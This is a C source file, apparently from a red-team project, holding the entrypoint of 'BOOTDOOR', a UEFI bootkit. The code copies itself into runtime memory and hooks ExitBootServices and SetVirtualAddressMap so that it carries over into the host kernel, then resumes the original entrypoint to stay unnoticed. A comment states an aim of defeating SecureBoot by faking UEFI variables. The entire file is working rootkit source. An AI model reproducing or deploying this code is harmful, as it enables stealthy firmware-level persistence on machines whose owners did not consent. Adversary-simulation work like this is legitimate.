/*!
 *
 * BOOTDOOR
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

/*!
 *
 * Purpose:
 *
 * BOOTDOOR rootkit entrypoint. Installs a hook on
 * ExitBootServices to transition to the kernel of
 * the host.
 *
 * Intended to also support SecureBoot hosts by
 * faking UEFI variables.
 *
!*/

D_SEC( A ) EFI_STATUS EFIAPI EfiMain( EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE * SystemTable )
{
	SIZE_T			Len = 0;
	EFI_PHYSICAL_ADDRESS	Phy = 0;

	PCFG			Cfg = NULL;
	PEFTBL			Tbl = NULL;
	PRNTBL			Rnt = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;

	Cfg = C_PTR( U_PTR( GetIp( ) ) + 11 );
	Len = ( U_PTR( U_PTR( GetIp( ) ) + 11 ) - U_PTR( G_PTR( EfiMain ) ) ) + sizeof( CFG ) + Cfg->Length;

	/* Allocate enough memory for the virtual form of the PE */
	if ( SystemTable->BootServices->AllocatePages( AllocateAnyPages, EfiRuntimeServicesData, ( ( ( Len + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) ) / 0x1000 ), &Phy ) == EFI_SUCCESS ) {
		Tbl = C_PTR( G_PTR( EfTbl ) );
		Rnt = C_PTR( G_PTR( RnTbl ) ); 

		/* Image Original Function Pointers */
		Tbl->ExitBootServices     = C_PTR( SystemTable->BootServices->ExitBootServices );
		Tbl->SetVirtualAddressMap = C_PTR( SystemTable->RuntimeServices->SetVirtualAddressMap ); 

		/* Image Runtime Pointers */
		Rnt->ImageAddrPhy  = C_PTR( Phy );
		Rnt->ImageAddrVir  = C_PTR( NULL );

		/* Copy over payload into new runtime region */
		__builtin_memcpy( C_PTR( Phy ), C_PTR( G_PTR( EfiMain ) ), Len );

		/* Insert hooks into runtime and boot functions */
		SystemTable->BootServices->ExitBootServices = C_PTR( U_PTR( U_PTR( Phy ) + ( G_PTR( ExitBootServices ) - G_PTR( EfiMain ) ) ) );
		SystemTable->RuntimeServices->SetVirtualAddressMap = C_PTR( U_PTR( U_PTR( Phy ) + ( G_PTR( SetVirtualAddressMap ) - G_PTR( EfiMain ) ) ) );
	};

	Dos = C_PTR( G_PTR( EfiMain ) );
	Dos = C_PTR( U_PTR( U_PTR( Dos ) &~ ( 0x20 - 1 ) ) );

	do {
		/* Has the MZ Stub? */
		if ( Dos->e_magic == IMAGE_DOS_SIGNATURE ) {
			/* Less than 0x100 bytes */
			if ( Dos->e_lfanew < 0x100 ) {
				/* Setup IMAGE_NT_HEADERS and check sig! */
				Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
				if ( Nth->Signature == IMAGE_NT_SIGNATURE ) {
					break;
				};
			};
		};
		Dos = C_PTR( U_PTR( Dos ) - 0x20 );
	} while ( TRUE );

	/* Execute original entrypoint to avoid issues */
	return ( ( __typeof__( EfiMain ) * ) C_PTR( U_PTR( Dos ) + Cfg->AddressOfEntrypoint ) )(
			ImageHandle, SystemTable
	);
};
